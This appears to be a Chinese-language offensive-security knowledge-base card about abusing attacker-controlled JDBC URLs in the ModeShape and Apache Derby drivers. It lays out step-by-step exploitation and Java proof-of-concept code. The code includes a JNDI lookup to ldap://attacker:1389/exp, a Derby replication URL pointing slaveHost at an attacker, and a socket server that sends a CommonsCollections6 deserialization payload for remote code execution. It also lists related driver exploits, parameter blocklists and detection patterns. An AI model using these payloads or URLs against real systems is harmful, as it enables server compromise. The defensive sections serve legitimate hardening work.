---
id: web-java-deserialization-jdbc-driver-jndi-derby-replication-jcr-modeshape
title: 冷门 JDBC 驱动自带的“连接即攻击”入口：ModeShape 的 jdbc:jcr:jndi 直接 lookup，Derby 的 startMaster/slaveHost 把复制流当序列化流读取
type: scenario
domain: web
path: web/java/deserialization
technique: jdbc-driver-url-jndi-derby-replication-deserialize
tags:
- java
- jdbc
- deserialization
- jndi
- derby
- modeshape
- driver
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:57:47+08:00'
  notes: 已对照原文核对；本次核对未读取图片；ModeShape 侧 jdbc:jcr:jndi:ldap://... 由 LocalRepositoryDelegate 触发 JNDI、Derby 侧 jdbc:derby:dbname;startMaster=true;slaveHost=... 经 ReplicationMessageTransmit$MasterReceiverThread#readMessage 到 SocketConnection.readMessage 反序列化，两者与正文描述及 Derby_JNDI_Server/JNDI Client 代码一致，原文用 CC6 载荷验证；原文对这两个驱动未给受影响版本区间（modeshape-jdbc 5.4.1.Final、derby 10.10.1.1 均为复现环境），故未设 versions；PoC 未对真实目标执行
url: /docs/web/java/deserialization/web-java-deserialization-jdbc-driver-jndi-derby-replication-jcr-modeshape/
draft: false
kb_aliases:
- jdbc:jcr:jndi
- ModeShape LocalRepositoryDelegate JNDI
- Derby startMaster slaveHost 反序列化
- ReplicationMessageTransmit readMessage
- JDBC URL 即攻击面
---

## 一句话结论

可控 JDBC URL 的攻击面远不止 MySQL 的 `autoDeserialize`：ModeShape 的 `LocalJcrDriver` 接受 `jdbc:jcr:jndi:<jndi-name>` 并把冒号后的字符串直接交给 JNDI lookup（`LocalRepositoryDelegate` 内即触发），Derby 的嵌入式驱动接受 `startMaster=true;slaveHost=<host>` 并主动连到“从库”读取复制消息，`ReplicationMessageTransmit$MasterReceiverThread#readMessage` → `SocketConnection.readMessage` 会对流做 Java 反序列化。两者都属于“驱动把 URL 参数当成连接配置之外的能力（远程加载/反序列化）”，只要有任意一处 JDBC URL 可控（连接测试页、数据源配置、报表/ETL 参数），就能直接打到 RCE 或反序列化 gadget。

## 原理

- **驱动是攻击面，而不是数据库客户端**：JDBC URL 的查询参数/路径段由驱动自己解析并执行动作。除了众所周知的 MySQL `autoDeserialize`+拦截器、PostgreSQL `socketFactory`、H2 `INIT=RUNSCRIPT`、DB2 `clientRerouteServerListJNDIName`，还有一批“冷门但对攻击者极友好”的驱动：
  - **ModeShape（`modeshape-jdbc`）**：`org.modeshape.jdbc.LocalJcrDriver` 用于连本地 JCR 仓库；它的 URL 形式 `jdbc:jcr:jndi:<name>` 表示“按 JNDI 名称查找仓库”，`LocalRepositoryDelegate` 里直接调用 JNDI 查找，于是 `<name>` 可以是 `ldap://attacker:1389/x`，触发 JNDI 注入（远程 codebase/反序列化取决于 JDK 与 LDAP 返回）。
  - **Apache Derby（嵌入式驱动）**：`jdbc:derby:<db>;startMaster=true;slaveHost=<host>` 让本机作为复制主库去连从库；驱动用 `ReplicationMessageTransmit$MasterReceiverThread#readMessage` 读取对端发来的消息，最终走到 `org.apache.derby.impl.store.replication.net.SocketConnection.readMessage`，对 socket 流做 `ObjectInputStream` 反序列化（原文用 CommonsCollections6 链验证）。
- **为什么这是“连接即攻击”**：两条路径都不需要数据库真的存在或认证成功。ModeShape 只要 JNDI 名称能被解析；Derby 的 `startMaster` 只需要一个已创建的库（`create=true` 建库一次即可），复制握手阶段就会读对端字节。
- **共同根因**：驱动把“URL 字符串”当成可信配置，允许它指定网络位置（JNDI/JMX/RMI/复制对端）与反序列化格式；一旦 URL 可被外部输入污染，攻击者就能把服务端的出站连接指向自己。
- **与已知链路的关系**：MySQL 反序列化、pgjdbc `socketFactory`、H2 `INIT`、DB2 JNDI 都已有独立卡片；本卡补的是 ModeShape 与 Derby 这两条“驱动自带 JNDI / 自带反序列化”的入口，便于在目标 classpath 恰好有这两个依赖时直接命中。

## 触发条件

- 应用存在“用户可控 JDBC URL”的入口：数据源测试/连接测试接口、报表/ETL 连接参数、低代码平台的数据源配置、`DriverManager.getConnection(userInput)`。
- 目标 classpath 含对应驱动：`modeshape-jdbc`（含 JCR/JNDI 相关依赖），或 `org.apache.derby:derby`（嵌入式驱动）。
- 出网可达攻击者控制的 LDAP/RMI 服务（ModeShape），或可达攻击者的复制端口（Derby）；Derby 场景还需目标上存在一个可打开的库（可先用 `create=true` 建库）。
- JNDI 路径受 JDK 版本影响（高版本默认禁止远程 codebase，需配合本地工厂/gadget 或反序列化链）。

## 利用步骤

1. 确认 URL 可控且应用确实会 `DriverManager.getConnection(url)`（报错文案、连接延迟、自建监听服务观察回连）。
2. 探测 classpath：通过报错信息（`ClassNotFoundException`/`No suitable driver`）、已知依赖版本、或 `jdbc:` 前缀回显判断驱动是否存在。
3. **ModeShape 路线**：起 LDAP/RMI 服务（返回 Reference 或序列化 gadget），提交 `jdbc:jcr:jndi:ldap://attacker:1389/exp`，观察目标是否发起 LDAP 查询并加载远程对象。
4. **Derby 路线**：先让目标库存在（`jdbc:derby:dbname;create=true` 一次），再提交 `jdbc:derby:dbname;startMaster=true;slaveHost=<attacker>`；攻击端起一个 socket 服务，连上后直接写入 CC6 序列化字节（原文的 `Derby_JNDI_Server` 就是 `accept` 后 `write(payload)`）。
5. 命中后按 gadget 收尾（命令执行/内存马），并检查是否有其它驱动可复用同一入口（H2/MySQL/PostgreSQL/DB2）。

## PoC

```java
// ModeShape：URL 里的 JNDI 名称被 LocalRepositoryDelegate 直接 lookup
Class.forName("org.modeshape.jdbc.LocalJcrDriver");
DriverManager.getConnection("jdbc:jcr:jndi:ldap://attacker:1389/exp");
```

```java
// Derby：嵌入式驱动作为复制主库连 slaveHost，读取并反序列化对端消息
Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
// 第一次先建库，否则连接失败
DriverManager.getConnection("jdbc:derby:dbname;create=true").close();
// 触发复制握手：驱动连到 attacker 的端口读 ObjectInputStream
DriverManager.getConnection("jdbc:derby:dbname;startMaster=true;slaveHost=attacker");
```

```java
// 攻击端：等目标连上来后直接写序列化流（原文用 CC6）
ServerSocket server = new ServerSocket(4851);
Socket s = server.accept();
s.getOutputStream().write(Files.readAllBytes(Paths.get("cc6.ser")));
s.getOutputStream().flush();
```

说明：PoC 按原文代码整理，未对真实目标执行；Derby 侧需要目标库已存在（原文明确“先 create=true 建库才能顺利执行”），且 `slaveHost` 端口要与攻击端监听一致。

## 变体与关联

- **同族驱动入口**：MySQL `autoDeserialize`+`ServerStatusDiffInterceptor`/`detectCustomCollations`、PostgreSQL `socketFactory`（CVE-2022-21724）、H2 `INIT=RUNSCRIPT`/`CREATE ALIAS`、DB2 `clientRerouteServerListJNDIName`、HSQL `CALL` 静态方法、ClickHouse JDBC bridge。
- **JNDI 侧变体**：ModeShape 的 JNDI 名称可换成 `rmi://`、`iiop://`、本地 `java:comp/env/...`；高版本 JDK 需配合 Tomcat/DBCP 的本地工厂（`org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory` + `Reference` 指向 JDBC URL）做二次跳转。
- **Derby 侧变体**：`replication` 相关参数（`startSlave`、`slaveHost`、`slavePort`）都可尝试；Derby 还有 `sqlj.install_jar`/`create type ... external name` 等 SQL 层类加载能力（在 SQL 执行面可用时）。
- **关联**：`web-java-deserialization-mysql-jdbc-url-autodeserialize-rce`（MySQL 同类入口）、`web-java-component-pgjdbc-cve-2022-21724-socketfactory-spring-xml-rce`（PostgreSQL 同类入口）、`web-java-component-h2-jdbc-url-filter-bypass-runscript`（H2 同类入口）、`web-java-component-smartbi-rmiservlet-db2-jdbc-jndi-rce`（DB2 JNDI 的产品化案例）。
- **边界**：URL 参数白名单/前缀校验、驱动升级到限制任意类加载的版本、JDK 高版本禁止远程 codebase、目标无出网、Derby 库不存在或复制端口不可达时，对应路线不成立。

## 检测与防御

- **统一收口**：禁止用户控制 JDBC URL 的 host 与参数；数据源配置只允许服务端预置的连接串，测试接口仅管理员可用并二次鉴权。
- **参数黑名单/白名单**：显式拒绝 `autoDeserialize`、`detectCustomCollations`、`queryInterceptors`、`statementInterceptors`、`socketFactory`、`socketFactoryArg`、`INIT`、`RUNSCRIPT`、`clientRerouteServerListJNDIName`、`startMaster`、`slaveHost`、`jndi`、`ConfigurePath` 等键（含大小写与编码变体）。
- **出站限制**：应用服务器不应能访问任意 LDAP/RMI/自定义端口；出站白名单 + DNS 日志。
- **运行时**：JDK 升级并设置 `com.sun.jndi.ldap.object.trustURLCodebase=false`（默认已 false）；启用 JEP 290 反序列化过滤器（`jdk.serialFilter`）阻断 CC 类；Derby/ModeShape 等非常用驱动从生产 classpath 移除。
- **检测**：JDBC URL 中出现 `jdbc:jcr:jndi`、`startMaster`、`slaveHost`、`clientRerouteServerListJNDIName`、`socketFactory`、`INIT=` 等特征；Java 进程向 LDAP(389/1389)/RMI(1099)/非业务端口发起连接；复制端口收到目标回连；`ObjectInputStream` 反序列化异常堆栈出现在复制/连接建立阶段。
